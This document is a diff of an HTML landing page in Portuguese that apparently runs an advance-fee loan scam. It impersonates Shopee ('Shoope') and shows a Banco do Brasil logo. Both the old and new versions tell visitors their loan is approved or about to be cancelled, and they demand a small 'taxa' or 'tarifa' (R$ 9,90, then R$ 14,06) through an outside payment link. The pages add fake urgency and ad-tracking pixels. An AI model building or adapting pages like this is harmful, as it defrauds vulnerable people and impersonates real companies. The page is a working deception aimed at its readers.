@@ -1,162 +1,260 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Shoope</title>
-  <link rel="preload" href="css/style.css" as="style">
-  <link rel="preload" href="css/slider.css" as="style">
-  <link rel="preload" href="css/animated.css" as="style">
-  <link rel="preload" href="css/notiflix-3.2.5.min.css" as="style">
-  <link rel="stylesheet" href="css/style.css">
-  <link rel="stylesheet" href="css/slider.css">
-  <link rel="stylesheet" href="css/animated.css">
-  <link rel="stylesheet" href="css/notiflix-3.2.5.min.css">
-  <link rel="shortcut icon" href="images/faveicon.png">
-<script>  window.pixelId = "6866fbff07ea88c3a62410ad";  var a = document.createElement("script");  a.setAttribute("async", "");  a.setAttribute("defer", "");  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");  document.head.appendChild(a);</script>
-  <script type="text/javascript">
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "s8vuwmcvbq");
 </script>
-      <script src="js/br.js" defer=""></script>
+<script>
+  window.pixelId = "6866fbff07ea88c3a62410ad";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
 
-
-
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f9f9f9;
-      margin: 0;
-      padding: 0;
-      visibility: hidden;
-    }
-    .container {
-      max-width: 500px;
-      margin: 20px auto;
-      background-color: #fff;
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    .alert {
-      font-size: 13px;
-      color: #842029;
-      border: 1px solid #f5c2c7;
-      padding: 10px;
-      background-color: #f8d7da;
-      border-radius: 10px;
-      margin-top: 15px;
-    }
-    .progress-container {
-      width: 100%;
-      background-color: #e0e0e0;
-      border-radius: 5px;
-      overflow: hidden;
-      margin: 20px 0;
-      height: 30px;
-    }
-    .progress-bar {
-      width: 0%;
-      height: 100%;
-      background-color: #fe6233;
-      color: #fff;
-      text-align: center;
-      line-height: 30px;
-      transition: width 0.4s ease;
-      font-weight: bold;
-    }
-    .btn {
-      display: block;
-      background-color: #fe6233;
-      color: white;
-      padding: 15px;
-      border: none;
-      border-radius: 10px;
-      width: 100%;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-    .footer-logo {
-      margin-top: 30px;
-    }
-    #preloader {
-      background: #ffffff;
-      position: fixed;
-      z-index: 9999;
-      width: 100%;
-      height: 100%;
-      top: 0;
-      left: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .tarifa-valor {
-      font-size: 16px;
-      font-weight: bold;
-      color: #fe6233;
-      margin-top: 20px;
-    }
-  </style>
-<script src="js/br.js" defer=""></script></head>
-<body>
-  <div id="preloader">
-    <img src="images/unnamed.png" alt="Carregando..." style="width: 50px;">
-  </div>
-
-  <div class="container">
-    <div class="alert">
-      <strong>ATENÇÃO:</strong><br>
-      Caso o pagamento da tarifa não seja realizado nos próximos minutos, o empréstimo será automaticamente cancelado pelo sistema.
-    </div>
-    <div class="progress-container">
-      <div id="myProgressBar" class="progress-bar">0%</div>
-    </div>
-    <img src="images/C-pia-de-Inserir-um-t-tulo-1.png" alt="Saque" style="width: 80%; max-width: 400px; margin: 20px auto;">
-    <p style="font-size: 14px;">
-      Para liberação, é necessário realizar o pagamento da tarifa de validação. Após o pagamento, o valor será transferido imediatamente para sua chave PIX.<br><br>
-      <strong>Evite o cancelamento automático e confirme agora.</strong>
-    </p>
-
-    <p class="tarifa-valor">Valor da tarifa: <strong>R$ 9,90</strong></p>
-
-    <a style="max-width:95%;text-decoration: none;" href="https://www.seguropagamentos.com.br/shoopeup8" class="btn pagamentoBanco do Brasil" id="paymentButton">PAGAR TARIFA E RECEBER</a>
-
-    <div class="footer-logo">
-      <img src="images/channels4_profile.jpg" alt="Banco do Brasil" style="width: 35px;">
-    </div>
-    <p style="font-size: 12px; color: gray; margin-top: 10px;">Shoope, 2025. Todos os direitos reservados.</p>
-  </div>
-
-  <script src="js/notiflix-3.2.5.min.js"></script>
-  <script>
-    function updateProgressBar() {
-      const progressBar = document.getElementById('myProgressBar');
-      let width = 0;
-      const interval = setInterval(() => {
-        if (width >= 90) {
-          clearInterval(interval);
-        } else {
-          width++;
-          progressBar.style.width = width + '%';
-          progressBar.textContent = width + '%';
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Empréstimo Aprovado!</title>
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@1.7.0/dist/lottie-player.js"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #e3f2fd, #ffffff);
+            margin: -28px 10px 20px;
+            padding: 0;
+            color: #333;
         }
-      }, 20);
-    }
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            background: #ffffff;
+            padding: 40px 20px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1 {
+            font-size: 28px;
+            color: #2c3e50;
+            margin-bottom: 15px;
+        }
+        h2 {
+            font-size: 24px;
+            color: #fe6233;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+            color: #7f8c8d;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .highlight {
+            font-size: 20px;
+            color: #d35400;
+            font-weight: bold;
+        }
+        .cta-button {
+            display: inline-block;
+            background-color: #fe6233;
+            color: #ffffff;
+            padding: 14px 30px;
+            font-size: 18px;
+            text-decoration: none;
+            border-radius: 50px;
+            margin: 10px;
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+        .cta-button:hover {
+            background-color: #138c3a;
+            transform: translateY(-4px);
+        }
+        .cta-button:active {
+            transform: translateY(2px);
+        }
+        .cta-button:focus {
+            outline: none;
+        }
+        .alert {
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #fef8e7;
+            color: #b35900;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: left;
+            border: 2px solid #e0c29d;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .alert lottie-player {
+            width: 60px;
+            height: 60px;
+        }
+        .success-icon {
+            width: 100px;
+            margin: 20px auto;
+        }
+    </style>
+</head>
+<body>
 
-    window.onload = function () {
-      document.getElementById('preloader').style.display = 'none';
-      document.body.style.visibility = 'visible';
-      updateProgressBar();
-    };
+    <div class="container">
+        <!-- Ícone de sucesso -->
+        <div class="success-icon">
+            <lottie-player src="https://assets2.lottiefiles.com/packages/lf20_touohxv0.json" background="transparent" speed="1" autoplay></lottie-player>
+        </div>
 
-  
-  </script>
+        <h1>Parabéns! Seu empréstimo foi aprovado!</h1>
+        <h2>R$ 20.000 adicionais estão disponíveis para você!</h2>
 
+        <p>
+            O valor de <strong>R$ 20.000</strong> está pronto para ser liberado!  
+            Para concluir, é necessário o pagamento de uma pequena taxa de <span class="highlight">R$ 14,06</span>.
+        </p>
 
-</body></html>
+        <p>Não perca essa oportunidade e finalize o processo agora mesmo.</p>
+
+        <!-- Mensagem de atenção -->
+        <div class="alert">
+            <lottie-player src="https://assets8.lottiefiles.com/packages/lf20_qy5ozs5v.json" background="transparent" speed="1" loop autoplay></lottie-player>
+            <p><strong>Atenção:</strong> Sem o pagamento desta taxa, não será possível liberar o valor adicional.</p>
+        </div>
+
+        <!-- Botão -->
+        <a href="https://seguropagamentos.com.br/shoopeup9" class="cta-button" target="_blank">Pagar Agora</a>
+    </div>
+
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+</body>
+</html>
